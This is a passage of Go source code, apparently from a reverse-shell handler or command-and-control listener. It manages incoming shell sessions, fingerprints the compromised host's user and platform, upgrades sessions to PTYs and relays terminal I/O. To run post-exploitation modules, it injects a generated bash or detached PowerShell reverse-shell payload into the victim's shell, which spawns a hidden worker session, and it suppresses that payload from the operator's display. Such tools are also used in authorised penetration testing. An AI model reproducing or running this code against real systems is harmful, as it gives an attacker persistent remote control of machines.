	m.spinnerStop = stop
	m.spinnerUpdate = update
}

// SetTransferProgressFunc sets the callback for transfer progress updates.
func (m *Manager) SetTransferProgressFunc(fn func(string, int, string, bool)) {
	m.transferProgressFunc = fn
}

// SetTransferDoneFunc sets the callback for transfer completion.
func (m *Manager) SetTransferDoneFunc(fn func(string, bool, error)) {
	m.transferDoneFunc = fn
}

// SetShellOutputFunc sets the callback for shell relay output to the TUI.
func (m *Manager) SetShellOutputFunc(fn func(string, int, []byte)) {
	m.shellOutputFunc = fn
}

// SetSessionDisconnectFunc sets the callback for session disconnect events.
func (m *Manager) SetSessionDisconnectFunc(fn func(int, string)) {
	m.sessionDisconnFunc = fn
}

// StartShellRelay starts a background goroutine that reads from the selected
// session's net.Conn and sends output to the TUI via shellOutputFunc.
func (m *Manager) StartShellRelay(cols, rows int) error {
	m.mu.Lock()
	if m.selectedSession == nil {
		m.mu.Unlock()
		return fmt.Errorf("No session selected")
	}
	session := m.selectedSession

	// If relay already running for this session, just return
	if session.relayActive {
		m.mu.Unlock()
		return nil
	}

	// Send Ctrl+C to kill any leftover foreground process and drain output
	session.Conn.Write([]byte("\x03"))
	time.Sleep(200 * time.Millisecond)
	drainBuf := make([]byte, 4096)
	session.Conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
	for {
		_, err := session.Conn.Read(drainBuf)
		if err != nil {
			break
		}
	}
	session.Conn.SetReadDeadline(time.Time{})

	handler := session.Handler
	platform := session.Platform
	m.mu.Unlock()

	// PTY upgrade (must happen before relay starts, needs to read/write conn)
	if platform != "windows" && handler != nil {
		if cols > 0 && rows > 0 {
			handler.SetViewportSize(cols, rows)
		}
		spinID := m.startSpinner("Upgrading to PTY...")
		handler.AttemptPTYUpgrade()
		m.stopSpinner(spinID)

		// Drain any leftover output from PTY setup before relay starts
		time.Sleep(100 * time.Millisecond)
		drainBuf := make([]byte, 4096)
		session.Conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
		for {
			_, err := session.Conn.Read(drainBuf)
			if err != nil {
				break
			}
		}
		session.Conn.SetReadDeadline(time.Time{})
	}

	m.mu.Lock()
	// Init logging
	if err := session.InitLogFile(); err == nil && session.LogFile != nil {
		handler.SetLogWriter(session.LogFile)
		m.hasCreatedLogs = true
	}

	ctx, cancel := context.WithCancel(context.Background())
	session.relayCancel = cancel
	session.relayActive = true
	conn := session.Conn
	sessionID := session.ID
	numID := session.NumID
	logWriter := session.LogFile
	m.mu.Unlock()

	go func() {
		defer func() {
			m.mu.Lock()
			if s, ok := m.sessions[sessionID]; ok {
				s.relayActive = false
				s.relayCancel = nil
			}
			m.mu.Unlock()
		}()

		buf := make([]byte, 4096)
		for {
			select {
			case <-ctx.Done():
				return
			default:
			}

			conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
			n, err := conn.Read(buf)
			if n > 0 {
				data := make([]byte, n)
				copy(data, buf[:n])

				if logWriter != nil {
					logWriter.Write(data)
				}

				// Suppress relay output based on relaySuppressNano:
				// - Future timestamp (spawn): suppress ALL output until that time
				// - Past timestamp (resize): suppress stty echo/prompts for 500ms
				if nanos := m.relaySuppressNano.Load(); nanos > 0 {
					suppressUntil := time.Unix(0, nanos)
					now := time.Now()
					if suppressUntil.After(now) {
						// Future: suppress everything (spawn payload suppression)
						continue
					}
					elapsed := now.Sub(suppressUntil)
					if elapsed < 500*time.Millisecond && isSttyEcho(data) {
						// Past within 500ms: suppress stty echo/prompts only
						continue
					}
					if elapsed >= 500*time.Millisecond {
						m.relaySuppressNano.Store(0)
					}
				}

				if m.shellOutputFunc != nil {
					m.shellOutputFunc(sessionID, numID, data)
				}
			}
			if err != nil {
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					continue
				}
				return
			}
		}
	}()

	return nil
}

// StopShellRelay stops the relay goroutine for the selected session.
func (m *Manager) StopShellRelay() {
	m.mu.RLock()
	session := m.selectedSession
	m.mu.RUnlock()

	if session != nil && session.relayCancel != nil {
		session.relayCancel()
	}
}

// ResizePTY sends stty resize to the selected session's remote PTY.
func (m *Manager) ResizePTY(cols, rows int) {
	m.mu.RLock()
	session := m.selectedSession
	m.mu.RUnlock()

	if session == nil || !session.relayActive {
		return
	}

	m.relaySuppressNano.Store(time.Now().UnixNano())
	sttyCmd := fmt.Sprintf("stty rows %d cols %d\n", rows, cols)
	session.Conn.Write([]byte(sttyCmd))
}

// extractPercent parses a percentage from progress text like "Uploading... 15.2 KB / 32.0 KB (47%)".
// Returns -1 if no percentage found.
func extractPercent(text string) int {
	// Find last occurrence of "(" followed by digits and "%)"
	idx := strings.LastIndex(text, "%")
	if idx <= 0 {
		return -1
	}
	// Walk backwards to find digits
	start := idx - 1
	for start >= 0 && text[start] >= '0' && text[start] <= '9' {
		start--
	}
	start++ // move past non-digit
	if start >= idx {
		return -1
	}
	pct, err := strconv.Atoi(text[start:idx])
	if err != nil {
		return -1
	}
	return pct
}

// isSttyEcho returns true if a chunk of shell output looks like stty resize
// echo and/or a bare prompt (no real user content). Used to suppress the
// visual noise from PTY resize commands.
func isSttyEcho(data []byte) bool {
	s := string(data)
	// Normalize line endings
	s = strings.ReplaceAll(s, "\r\n", "\n")
	s = strings.ReplaceAll(s, "\r", "")

	for _, line := range strings.Split(s, "\n") {
		// Strip ANSI escape sequences for matching
		clean := stripANSI(line)
		clean = strings.TrimSpace(clean)
		if clean == "" {
			continue
		}
		// Line contains any stty command — definitely echo
		if strings.Contains(clean, "stty ") {
			continue
		}
		// Bare prompt: ends with $, #, >, or % (common shell prompts)
		if len(clean) > 0 {
			last := clean[len(clean)-1]
			if last == '$' || last == '#' || last == '>' || last == '%' {
				continue
			}
		}
		// Something else — this is real content
		return false
	}
	return true
}

// stripANSI removes ANSI escape sequences from a string (simple version for matching).
func stripANSI(s string) string {
	var result []byte
	i := 0
	for i < len(s) {
		if s[i] == '\033' {
			// Skip ESC sequences
			i++
			if i < len(s) && s[i] == '[' {
				i++
				for i < len(s) && s[i] >= 0x20 && s[i] <= 0x3F {
					i++
				}
				if i < len(s) {
					i++ // skip final byte
				}
			}
			continue
		}
		result = append(result, s[i])
		i++
	}
	return string(result)
}

// WriteToShell writes data to the selected session's connection.
func (m *Manager) WriteToShell(data string) error {
	m.mu.RLock()
	session := m.selectedSession
	m.mu.RUnlock()

	if session == nil {
		return fmt.Errorf("No session selected")
	}

	_, err := session.Conn.Write([]byte(data))
	return err
}

// startSpinner starts a TUI spinner and returns its ID for stopping later.
func (m *Manager) startSpinner(text string) int {
	m.nextSpinnerID++
	id := m.nextSpinnerID
	if m.spinnerStart != nil {
		m.spinnerStart(id, text)
	}
	return id
}

// stopSpinner stops a TUI spinner by ID.
func (m *Manager) stopSpinner(id int) {
	if m.spinnerStop != nil {
		m.spinnerStop(id)
	}
}

// SetListenerIP sets the listener IP and port for payload generation
func (m *Manager) SetListenerIP(ip string) {
	m.listenerIP = ip
}

// SetListenerPort sets the listener port for payload generation
func (m *Manager) SetListenerPort(port int) {
	m.listenerPort = port
}

// AddSession adiciona uma nova sessão ao gerenciador
func (m *Manager) AddSession(id string, conn net.Conn, remoteIP string) {
	handler := NewHandler(conn, id)

	// Configure callback para quando conexão fechar
	handler.SetCloseCallback(func(sessionID string) {
		m.RemoveSession(sessionID)
	})

	// Lock only for map mutation
	m.mu.Lock()
	isWorker := m.pendingWorker.CompareAndSwap(true, false)
	session := &SessionInfo{
		ID:        id,
		NumID:     m.nextVisibleSessionID(isWorker),
		Conn:      conn,
		RemoteIP:  remoteIP,
		Whoami:    "detecting...",
		Platform:  "detecting...",
		Handler:   handler,
		Active:    false,
		CreatedAt: time.Now(),
	}
	// Check if this is a worker session (spawned for module execution)
	if isWorker {
		session.isWorker = true
	}
	m.sessions[id] = session
	m.mu.Unlock()

	if session.isWorker {
		// Worker: silent detection, no notifications, no spinner, no stdout
		old := os.Stdout
		oldErr := os.Stderr
		devnull, _ := os.Open(os.DevNull)
		os.Stdout = devnull
		os.Stderr = devnull
		m.detectSessionInfo(session)
		os.Stdout = old
		os.Stderr = oldErr
		devnull.Close()
		handler.SetPlatform(session.Platform)
	} else {
		// Normal session: full notifications
		m.notify(ui.SessionOpened(session.NumID, remoteIP))
		m.notifyOverlay(fmt.Sprintf("Reverse shell received on session %d (%s)", session.NumID, remoteIP), 1)

		spinID := m.startSpinner("Detecting session info...")
		m.detectSessionInfo(session)
		m.stopSpinner(spinID)

		handler.SetPlatform(session.Platform)

		// Notify detection results
		infoMsg := fmt.Sprintf("Session %d: %s (%s)", session.NumID, session.Whoami, session.Platform)
		m.notify(ui.Info(infoMsg) + "\n")

		// Auto-select first non-worker session
		m.mu.Lock()
		if m.selectedSession == nil {
			m.selectedSession = session
		}
		m.mu.Unlock()
	}

	// Start session health monitoring
	go m.monitorSession(session)
}

// RemoveSession remove uma sessão do gerenciador
func (m *Manager) RemoveSession(id string) {
	m.mu.Lock()
	defer m.mu.Unlock()

	session, exists := m.sessions[id]
	if !exists {
		return
	}

	if !session.isWorker {
		m.notify(ui.SessionClosed(session.NumID, session.RemoteIP))
		m.notifyOverlay(fmt.Sprintf("Session %d (%s) closed", session.NumID, session.RemoteIP), 2)
	}

	// Cancel relay goroutine if running
	if session.relayCancel != nil {
		session.relayCancel()
	}

	// Notify TUI about disconnect (for auto-return from shell mode) — skip workers
	if m.sessionDisconnFunc != nil && !session.isWorker {
		m.sessionDisconnFunc(session.NumID, session.RemoteIP)
	}

	// Close log file if open
	if session.LogFile != nil {
		session.LogFile.WriteString(fmt.Sprintf("\n--- Session %d closed at %s ---\n", session.NumID, time.Now().Format("2006-01-02 15:04:05")))
		session.LogFile.Close()
		session.LogFile = nil
	}

	// Se era a sessão selecionada, limpar seleção
	if m.selectedSession != nil && m.selectedSession.ID == id {
		m.selectedSession = nil
	}

	delete(m.sessions, id)

	// Se era a sessão ativa, voltar ao menu
	if session.Active {
		m.activeConn = nil
		m.menuActive = true
	}
}

// ListSessions mostra todas as sessões ativas
func (m *Manager) ListSessions() {
	m.mu.RLock()
	defer m.mu.RUnlock()

	if len(m.sessions) == 0 {
		fmt.Println(ui.Info("No active sessions"))
		return
	}

	// Collect all session lines
	var lines []string
	lines = append(lines, ui.TableHeader("id  remote address     whoami                    platform"))

	// Ordenar por NumID para exibição consistente
	var sessions []*SessionInfo
	for _, session := range m.sessions {
		if session.isWorker {
			continue // Hide worker sessions
		}
		sessions = append(sessions, session)
	}
	sort.Slice(sessions, func(i, j int) bool {
		return sessions[i].NumID < sessions[j].NumID
	})

	if len(sessions) == 0 {
		fmt.Println(ui.Info("No active sessions"))
		return
	}

	for _, session := range sessions {
		sessionLine := fmt.Sprintf("%-3d %-18s %-25s %s", session.NumID, session.RemoteIP, session.Whoami, session.Platform)
		if session.Active {
			lines = append(lines, ui.SessionActive(sessionLine))
		} else {
			lines = append(lines, ui.SessionInactive(sessionLine))
		}
	}

	// Render everything inside a box
	fmt.Println(ui.BoxWithTitle(fmt.Sprintf("%s Active Sessions", ui.SymbolGem), lines))
}

// UseSession seleciona uma sessão específica (não entra na shell)
func (m *Manager) UseSession(numID int) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	var targetSession *SessionInfo
	for _, session := range m.sessions {
		if session.NumID == numID {
			targetSession = session
			break
		}
	}

	if targetSession == nil {
		return fmt.Errorf("Session %d not found", numID)
	}

	// Testa se a sessão está viva antes de selecioná-la
	targetSession.Conn.SetWriteDeadline(time.Now().Add(1 * time.Second))
	_, err := targetSession.Conn.Write([]byte{})
	targetSession.Conn.SetWriteDeadline(time.Time{})

	if err != nil {
		// Sessão morta, remove ela
		m.mu.Unlock()
		fmt.Println(ui.Error("Session is dead, removing..."))
		m.RemoveSession(targetSession.ID)
		return fmt.Errorf("session %d is no longer alive", numID)
	}

	// Desativa todas as sessões
	for _, session := range m.sessions {
		session.Active = false
	}

	// Marca a sessão selecionada como ativa
	targetSession.Active = true
	m.selectedSession = targetSession
	fmt.Println(ui.UsingSession(targetSession.NumID, targetSession.RemoteIP))

	return nil
}

// KillSession mata uma sessão específica
func (m *Manager) KillSession(numID int) error {
	m.mu.Lock()

	var targetSession *SessionInfo
	for _, session := range m.sessions {
		if session.NumID == numID {
			targetSession = session
			break
		}
	}

	if targetSession == nil {
		m.mu.Unlock()
		return fmt.Errorf("Session %d not found", numID)
	}

	// Close log file if open
	if targetSession.LogFile != nil {
		targetSession.LogFile.WriteString(fmt.Sprintf("\n--- Session %d killed at %s ---\n", targetSession.NumID, time.Now().Format("2006-01-02 15:04:05")))
		targetSession.LogFile.Close()
		targetSession.LogFile = nil
	}

	// Fecha a conexão
	targetSession.Conn.Close()

	// Se era a sessão selecionada, limpa seleção
	if m.selectedSession != nil && m.selectedSession.ID == targetSession.ID {
		m.selectedSession = nil
	}

	// Save info before unlocking
	sessNumID := targetSession.NumID
	sessIP := targetSession.RemoteIP

	// Remove da lista
	delete(m.sessions, targetSession.ID)
	m.mu.Unlock()

	// Print to output (captured by captureStdout in TUI mode — no deadlock)
	fmt.Println(ui.SessionClosed(sessNumID, sessIP))

	return nil
}

// handleModulesList lista todos os módulos disponíveis
func (m *Manager) handleModulesList() {
	registry := GetModuleRegistry()
	categories := registry.ListByCategory()

	if len(categories) == 0 {
		fmt.Println(ui.Info("No modules available"))
		return
	}

	var lines []string

	// Explicit category order (Linux, Windows, Misc, Custom)
	categoryOrder := []string{"linux", "windows", "misc", "custom"}

	// Build module list grouped by category
	for _, cat := range categoryOrder {
		// Skip if category has no modules
		if len(categories[cat]) == 0 {
			continue
		}
		lines = append(lines, ui.CommandHelp(cat))
		for _, mod := range categories[cat] {
			modeSymbol := ui.ExecutionModeSymbol(mod.ExecutionMode())
			line := fmt.Sprintf("%s %-15s - %s", modeSymbol, mod.Name(), mod.Description())
			lines = append(lines, ui.Command(line))
		}
		lines = append(lines, "")
	}

	// Remove trailing empty line
	if len(lines) > 0 && lines[len(lines)-1] == "" {
		lines = lines[:len(lines)-1]
	}

	// Add legend at the bottom
	lines = append(lines, ui.ExecutionModeLegend())

	fmt.Println(ui.BoxWithTitle(fmt.Sprintf("%s Available Modules", ui.SymbolGem), lines))
}

// handleRunModule executa um módulo
func (m *Manager) handleRunModule(moduleName string, args []string) {
	// Check if session is selected
	if m.selectedSession == nil {
		fmt.Println(ui.Error("No session selected. Use 'use <id>' first."))
		return
	}

	// Get module from registry
	registry := GetModuleRegistry()
	module, exists := registry.Get(moduleName)
	if !exists {
		fmt.Println(ui.Error(fmt.Sprintf("Unknown module: %s", moduleName)))
		fmt.Println(ui.Info("Type 'modules' to see available modules"))
		return
	}

	// Create context with cancel for Ctrl+D handling
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Start watching for Ctrl+D in background
	WatchForCancel(ctx, cancel)

	// Show hint and run module
	fmt.Println(ui.Info(fmt.Sprintf("Running module: %s (%s)", module.Name(), module.Category())))
	fmt.Println(ui.CommandHelp("Press Ctrl+D to cancel"))

	if err := module.Run(ctx, m.selectedSession, args); err != nil {
		// Check if it was cancelled by user
		if ctx.Err() == context.Canceled {
			fmt.Println(ui.Warning("Module cancelled by user"))
		} else {
			fmt.Println(ui.Error(fmt.Sprintf("Module failed: %v", err)))
		}
		return
	}
}

// StartModule runs a module asynchronously with TUI spinner.
// Stops relay for exclusive conn access, opens terminal for output.
func (m *Manager) StartModule(moduleName string, args []string) {
	m.mu.RLock()
	session := m.selectedSession
	m.mu.RUnlock()

	if session == nil {
		if m.transferDoneFunc != nil {
			m.transferDoneFunc(moduleName, false, fmt.Errorf("No session selected"))
		}
		return
	}

	registry := GetModuleRegistry()
	module, exists := registry.Get(moduleName)
	if !exists {
		if m.transferDoneFunc != nil {
			m.transferDoneFunc(moduleName, false, fmt.Errorf("Unknown module: %s", moduleName))
		}
		return
	}

	spinID := m.startSpinner(fmt.Sprintf("Spawning worker shell for %s...", moduleName))

	go func() {
		// Like Penelope: spawn a NEW session to run the module.
		// The main session stays free for shell interaction.
		spawnIP := GlobalRuntimeConfig.GetPivotIP()
		if spawnIP == "" || m.listenerPort == 0 {
			m.stopSpinner(spinID)
			m.notify(ui.Error("Module failed: no listener IP/port available") + "\n")
			m.notifyOverlay(fmt.Sprintf("Module %s failed", moduleName), 2)
			return
		}

		// Send spawn payload (suppressed from shell viewport)
		if session.relayActive {
			m.relaySuppressNano.Store(time.Now().Add(2 * time.Second).UnixNano())
		}
		if session.Handler != nil && session.Handler.IsPTYUpgraded() {
			session.Conn.Write([]byte("stty -echo\n"))
			time.Sleep(100 * time.Millisecond)
		}

		gen := NewReverseShellGenerator(spawnIP, m.listenerPort)
		platform := session.Platform
		if platform == "detecting..." || platform == "unknown" {
			platform = "linux"
		}
		var payload string
		switch platform {
		case "linux", "macos":
			payload = gen.GenerateBash() + "\n"
		case "windows":
			payload = gen.GeneratePowerShellDetached() + "\n"
		default:
			m.stopSpinner(spinID)
			m.notify(ui.Error(fmt.Sprintf("Module failed: unsupported platform %s", platform)) + "\n")
			return
		}

		initialCount := m.getAllSessionCount()
		m.pendingWorker.Store(true) // Next AddSession will be marked as worker
		session.Conn.Write([]byte(payload))

		if session.Handler != nil && session.Handler.IsPTYUpgraded() {
			time.Sleep(100 * time.Millisecond)
			session.Conn.Write([]byte("stty echo\n"))
		}

		// Wait for worker session to connect (max 10s)
		var workerSession *SessionInfo
		for i := 0; i < 50; i++ {
			time.Sleep(200 * time.Millisecond)
			if m.getAllSessionCount() > initialCount {
				// Find the newest worker session explicitly. Workers no longer consume
				// visible NumIDs, so NumID ordering cannot identify them reliably.
				m.mu.RLock()
				workerSession = findNewestWorkerSession(m.sessions)
				m.mu.RUnlock()
				if workerSession != nil {
					break
				}
			}
		}

		if workerSession == nil {
			m.stopSpinner(spinID)
			m.notify(ui.Error(fmt.Sprintf("Module %s failed: worker shell did not connect", moduleName)) + "\n")
			m.notifyOverlay(fmt.Sprintf("Module %s failed — no worker shell", moduleName), 2)
			return
		}

		// Wait for worker detection (platform needed for module execution)
		for i := 0; i < 20; i++ {
			if workerSession.Platform != "detecting..." {
				break
			}
			time.Sleep(500 * time.Millisecond)
		}
		workerSession.Platform = resolveWorkerPlatform(workerSession.Platform, session.Platform)

		// Stop spinner — module is launching, user can continue working
		m.stopSpinner(spinID)

		// Notify immediately that module is running (terminal window opens during Run setup)
		m.notify(ui.Info(fmt.Sprintf("Module %s — output sent to new terminal window", moduleName)) + "\n")

		// Run module on worker (blocking — runs in this goroutine)
		old := os.Stdout
		devnull, _ := os.Open(os.DevNull)
		os.Stdout = devnull
		err := module.Run(context.Background(), workerSession, args)
		os.Stdout = old
		devnull.Close()

		if err != nil && err != context.DeadlineExceeded {
			m.notify(ui.Error(fmt.Sprintf("Module %s failed: %v", moduleName, err)) + "\n")
			m.notifyOverlay(fmt.Sprintf("Module %s failed", moduleName), 2)
		}

		// Kill worker session — closes TCP → remote shell gets SIGHUP → trap fires cleanup
		workerSession.Conn.Close()
		m.RemoveSession(workerSession.ID)
	}()
}

// detectSessionInfo detecta user@host e plataforma da sessão
func (m *Manager) detectSessionInfo(session *SessionInfo) {
	// Spinner only in non-TUI mode (raw stdout)
	var spinner *ui.Spinner
	if !m.silent {
		spinner = ui.NewSpinnerWithColor(ui.ColorCyan)
		spinner.Start("Detecting shell info...")
		defer spinner.Stop()
	}

	// Aguarda shell enviar algo
	time.Sleep(500 * time.Millisecond)

	// Phase 1: Read initial prompt to detect platform
	initialPrompt := ""
	buffer := make([]byte, 4096)

	for attempt := 0; attempt < 5; attempt++ {
		session.Conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
		n, err := session.Conn.Read(buffer)
		session.Conn.SetReadDeadline(time.Time{})

		if n > 0 {
			initialPrompt += string(buffer[:n])
		}

		if err == nil && n > 0 {
			continue
		}

		if len(initialPrompt) > 0 {
			break
		}

		time.Sleep(150 * time.Millisecond)
	}

	// Detect platform from initial prompt
	detectedPlatform := "unknown"

	if strings.Contains(initialPrompt, "PS ") && strings.Contains(initialPrompt, ">") {
		detectedPlatform = "windows"
	} else if strings.Contains(initialPrompt, "Microsoft Windows") {
		detectedPlatform = "windows"
	} else if strings.Contains(initialPrompt, "C:\\") || strings.Contains(initialPrompt, "C:/") {
		detectedPlatform = "windows"
	} else if strings.Contains(initialPrompt, "$") || strings.Contains(initialPrompt, "#") {
		detectedPlatform = "linux"
	}

	session.Platform = detectedPlatform

	// Phase 2: Send platform-specific detection commands
	var detectionCmd string
	if detectedPlatform == "windows" {
		// Windows: send whoami and hostname as separate commands
		detectionCmd = "whoami\r\nhostname\r\n"
	} else {
		// Linux/unknown: bash-compatible command
		detectionCmd = "echo $(whoami 2>/dev/null)@$(hostname 2>/dev/null)\n"
	}

	_, err := session.Conn.Write([]byte(detectionCmd))
	if err != nil {
		session.Whoami = "unknown"
		return
	}

	// Wait for execution
	time.Sleep(1000 * time.Millisecond)

	// Phase 3: Parse response
	allData := ""
	readBuffer := make([]byte, 2048)
	foundWhoami := false
	foundPlatform := detectedPlatform != "unknown"
	windowsUser := ""
	windowsHostname := ""

	for i := 0; i < 10; i++ {
		session.Conn.SetReadDeadline(time.Now().Add(1000 * time.Millisecond))
		n, err := session.Conn.Read(readBuffer)

		if err != nil {
			if foundWhoami && foundPlatform {
				break
			}
			if len(allData) > 0 && i < 5 {
				time.Sleep(200 * time.Millisecond)
				continue
			}
			break
		}

		chunk := string(readBuffer[:n])
		allData += chunk

		// Normalize line endings
		normalized := strings.ReplaceAll(allData, "\r\n", "\n")
		normalized = strings.ReplaceAll(normalized, "\r", "\n")

		var lines []string
		if strings.Contains(normalized, "\n") {
			lines = strings.Split(normalized, "\n")
		} else {
			lines = []string{normalized}
		}

		for _, line := range lines {
			line = strings.TrimSpace(line)

			// Platform detection from response (for shells that didn't show prompt initially)
			if !foundPlatform {
				if strings.Contains(line, "PS ") && strings.Contains(line, ">") && strings.Contains(line, ":\\") {
					session.Platform = "windows"
					foundPlatform = true
					detectedPlatform = "windows"
					// Send Windows-specific commands now
					session.Conn.Write([]byte("whoami\r\nhostname\r\n"))
				} else if strings.Contains(line, "C:\\") && strings.Contains(line, ">") {
					session.Platform = "windows"
					foundPlatform = true
					detectedPlatform = "windows"
					session.Conn.Write([]byte("whoami\r\nhostname\r\n"))
				}

				lowerLine := strings.ToLower(line)
				if strings.Contains(lowerLine, "linux") {
					session.Platform = "linux"
					foundPlatform = true
					detectedPlatform = "linux"
				} else if strings.Contains(lowerLine, "windows") {
					session.Platform = "windows"
					foundPlatform = true
					detectedPlatform = "windows"
				} else if strings.Contains(lowerLine, "darwin") {
					session.Platform = "macos"
					foundPlatform = true
					detectedPlatform = "macos"
				}
			}

			// Windows whoami parsing: DOMAIN\user and hostname
			if detectedPlatform == "windows" {
				// 1. Capture DOMAIN\user from whoami output
				if windowsUser == "" && strings.Contains(line, "\\") {
					// Extract part after last ">" if prompt is concatenated
					extracted := line
					if strings.Contains(line, ">") {
						parts := strings.Split(line, ">")
						if len(parts) > 1 {
							extracted = strings.TrimSpace(parts[len(parts)-1])
						}
					}

					// Validate the whoami output
					if strings.Contains(extracted, "\\") &&
						!strings.Contains(extracted, "whoami") &&
						!strings.Contains(extracted, "hostname") &&
						!strings.Contains(extracted, "PS ") &&
						!strings.Contains(extracted, ">") &&
						len(extracted) > 3 && len(extracted) < 50 {

						parts := strings.Split(extracted, "\\")
						if len(parts) == 2 && len(parts[0]) > 0 && len(parts[1]) > 0 {
							windowsUser = parts[1]
						}
					}
				}

				// 2. Capture hostname (clean line, no special chars)
				if windowsHostname == "" &&
					!strings.Contains(line, "\\") &&
					!strings.Contains(line, ">") &&
					!strings.Contains(line, "whoami") &&
					!strings.Contains(line, "hostname") &&
					!strings.Contains(line, "PS ") &&
					!strings.Contains(line, "C:") &&
					!strings.Contains(line, "echo") &&
					len(strings.TrimSpace(line)) > 0 &&
					len(strings.TrimSpace(line)) < 50 {

					cleaned := strings.TrimSpace(line)
					isValidHostname := true
					for _, c := range cleaned {
						if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
							(c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.') {
							isValidHostname = false
							break
						}
					}
					if isValidHostname && len(cleaned) > 0 {
						windowsHostname = cleaned
					}
				}

				// 3. Combine user@hostname
				if windowsUser != "" && windowsHostname != "" && !foundWhoami {
					session.Whoami = fmt.Sprintf("%s@%s", windowsUser, windowsHostname)
					foundWhoami = true
				}
			} else if (detectedPlatform == "linux" || detectedPlatform == "unknown") && !foundWhoami {
				// Linux: user@hostname format
				if strings.Contains(line, "@") {
					if !strings.Contains(line, "echo") &&
						!strings.Contains(line, "whoami") &&
						!strings.Contains(line, "hostname") &&
						!strings.Contains(line, "$") &&
						!strings.Contains(line, "%") {

						parts := strings.Split(line, "@")
						if len(parts) == 2 && len(parts[0]) > 0 && len(parts[1]) > 0 && len(line) < 50 {
							session.Whoami = line
							foundWhoami = true
							detectedPlatform = "linux"
							session.Platform = "linux"
							foundPlatform = true
						}
					}
				}
			}

			// Found both - drain remaining and return
			if foundWhoami && foundPlatform {
				time.Sleep(100 * time.Millisecond)
				drainBuffer := make([]byte, 4096)
				session.Conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
				for {
					n, err := session.Conn.Read(drainBuffer)
					if err != nil || n == 0 {
						break
					}
				}
				session.Conn.SetReadDeadline(time.Time{})
				return
			}
		}
	}

	session.Conn.SetReadDeadline(time.Time{})

	// Phase 4: Fallback retry for Windows "unknown" whoami (10 second window)
	if detectedPlatform == "windows" && !foundWhoami {
		// Retry with explicit whoami and hostname commands
		session.Conn.Write([]byte("whoami\r\n"))
		time.Sleep(2 * time.Second)
		session.Conn.Write([]byte("hostname\r\n"))
		time.Sleep(2 * time.Second)

		retryBuffer := make([]byte, 4096)
		retryData := ""

		for i := 0; i < 6; i++ {
			session.Conn.SetReadDeadline(time.Now().Add(1 * time.Second))
			n, err := session.Conn.Read(retryBuffer)
			if err != nil {
				if len(retryData) > 0 {
					break
				}
				continue
			}
			retryData += string(retryBuffer[:n])
		}
		session.Conn.SetReadDeadline(time.Time{})

		// Parse retry data
		normalized := strings.ReplaceAll(retryData, "\r\n", "\n")
		normalized = strings.ReplaceAll(normalized, "\r", "\n")
		retryLines := strings.Split(normalized, "\n")

		for _, line := range retryLines {
			line = strings.TrimSpace(line)

			if windowsUser == "" && strings.Contains(line, "\\") {
				extracted := line
				if strings.Contains(line, ">") {
					parts := strings.Split(line, ">")
					extracted = strings.TrimSpace(parts[len(parts)-1])
				}
				if strings.Contains(extracted, "\\") &&
					!strings.Contains(extracted, "PS ") &&
					!strings.Contains(extracted, ">") &&
					len(extracted) > 3 && len(extracted) < 50 {
					parts := strings.Split(extracted, "\\")
					if len(parts) == 2 && len(parts[0]) > 0 && len(parts[1]) > 0 {
						windowsUser = parts[1]
					}
				}
			}

			if windowsHostname == "" &&
				!strings.Contains(line, "\\") &&
				!strings.Contains(line, ">") &&
				!strings.Contains(line, "PS ") &&
				!strings.Contains(line, "C:") &&
				len(line) > 0 && len(line) < 50 {

				isValid := true
				for _, c := range line {
					if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
						(c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.') {
						isValid = false
						break
					}
				}
				if isValid {
					windowsHostname = line
				}
			}
		}

		if windowsUser != "" && windowsHostname != "" {
			session.Whoami = fmt.Sprintf("%s@%s", windowsUser, windowsHostname)
			foundWhoami = true
		} else if windowsUser != "" {
			session.Whoami = windowsUser + "@unknown"
			foundWhoami = true
		}

		// Drain remaining
		drainBuffer := make([]byte, 4096)
		session.Conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
		for {
			n, err := session.Conn.Read(drainBuffer)
			if err != nil || n == 0 {
				break
			}
		}
		session.Conn.SetReadDeadline(time.Time{})
	}

	if !foundWhoami {
		session.Whoami = "unknown"
	}
	if !foundPlatform && session.Platform == "detecting..." {
		session.Platform = "unknown"
	}
}

// monitorSession monitora a saúde da sessão em background
func (m *Manager) monitorSession(session *SessionInfo) {
	for {
		time.Sleep(5 * time.Second) // Verifica a cada 5 segundos

		// Verifica se a sessão ainda existe
		m.mu.RLock()
		_, exists := m.sessions[session.ID]
		m.mu.RUnlock()

		if !exists {
			return // Sessão foi removida, para o monitoramento
		}

		// Testa se a conexão está viva
		session.Conn.SetWriteDeadline(time.Now().Add(1 * time.Second))
		_, err := session.Conn.Write([]byte{})
		session.Conn.SetWriteDeadline(time.Time{})

		if err != nil {
			// Dead connection — remove session
			m.RemoveSession(session.ID)
			return
		}
	}
}

// ShellSession entra na shell interativa da sessão selecionada
func (m *Manager) ShellSession() error {
	m.mu.Lock()

	if m.selectedSession == nil {
		m.mu.Unlock()
		return fmt.Errorf("No session selected. Use 'use <id>' first")
	}

	targetSession := m.selectedSession

	// Desativa sessão anterior
	for _, session := range m.sessions {
		session.Active = false
	}

	targetSession.Active = true
	m.activeConn = targetSession.Conn
	m.menuActive = false

	m.mu.Unlock()

	fmt.Println(ui.Info("Entering interactive shell"))
	fmt.Println(ui.CommandHelp("Press Ctrl-D to return to menu"))

	// Initialize session logging (lazy init on first shell interaction)
	if err := targetSession.InitLogFile(); err != nil {
		fmt.Println(ui.Warning(fmt.Sprintf("Could not init session log: %v", err)))
	} else if targetSession.LogFile != nil {
		targetSession.Handler.SetLogWriter(targetSession.LogFile)
	}

	// Inicia shell handler (bloqueia até sair)
	err := targetSession.Handler.Start()

	// Quando sair da shell, verificar se sessão ainda existe
	m.mu.Lock()
	if _, exists := m.sessions[targetSession.ID]; exists {
		targetSession.Active = false
	}
	m.activeConn = nil
	m.menuActive = true
	sessionCount := len(m.sessions)
	m.mu.Unlock()

	// Limpa buffer stdin antes de voltar ao menu
	m.flushStdin()

